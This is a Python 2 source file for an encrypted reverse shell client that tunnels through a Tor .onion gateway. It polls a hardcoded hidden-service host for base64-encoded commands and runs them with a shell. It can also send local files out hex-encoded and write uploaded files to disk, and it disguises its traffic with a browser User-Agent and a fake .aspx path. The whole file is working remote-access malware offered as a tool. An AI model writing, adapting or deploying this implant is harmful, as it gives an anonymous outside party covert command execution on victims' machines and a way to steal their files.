#!/usr/bin/python

#   Author = j0lly
#   BSD License
#
#   this code is an enanchment of an http encrypted reverse python shell fnd listener rom:
#
#         Dave Kennedy (ReL1K) http://www.secmaniac.com
#
#   most of the code come from him, I've just lean it and added the option to work with tor network.
#   The idea of a toryfied connection like this is not mine either, but come from:
#
#        Xavier Garcia http://www.shellguardians.com
#

import urllib, urllib2, httplib, subprocess, sys, base64, os, binascii, tempfile

# set our basic headers
headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)","Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
# your tor server + .to
server = "gx32knlxeynsijug.onion.to"

def send_file(doc):
        if  os.path.isfile(doc):
                fd=open(doc,'rb')
                data=fd.read()
                fd.close()
                return binascii.hexlify(data)
        else: return ""

def write_file(doc):
        if doc != "":
                fd, tmpPayload = tempfile.mkstemp(prefix="repytor")
                os.close(fd)
                fd=open(tmpPayload,'w')
                fd.write(binascii.unhexlify(doc))
                fd.close()
                return binascii.hexlify(tmpPayload)
        else: return ""

def manage_request(msg) :
	# quit out if we receive that command
	if msg == "quit" or msg == "exit":
                sys.exit()
        # send file to server if command == download
        elif msg[0:8] == "download" :
            print "Download %s" % msg[9:]
            data = send_file(msg[9:len(msg)])
            prefix = "dwl"
        # receive file from server if command == upload
        elif msg[0:6] == "upload" :
            data = write_file(msg[7:len(msg)])
            prefix = "upl"
        # else, run the shell comamnd
        else :
	    proc = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	    # read out the data of stdout
	    data = proc.stdout.read() + proc.stderr.read()
            prefix = "cmd"
        return prefix, data

# loop forever
while 1:

        # open up our request handelr
        req = urllib2.Request( 'https://' + server , headers=headers)
	# grab our response which contains what command we want
	message = urllib2.urlopen(req)
	# base64 unencode
	message = base64.b64decode(message.read())
        # manage request
        prefix, data = manage_request(message)
	# base64 encode the data
	data = base64.b64encode(data)
	# urlencode the data from stdout
	data = urllib.urlencode({ prefix : '%s'}) % ( data)
	# who we want to connect back to with the shell
	h = httplib.HTTPSConnection(server)
	# actually post the data
	h.request('POST', '/index.aspx', data, headers)
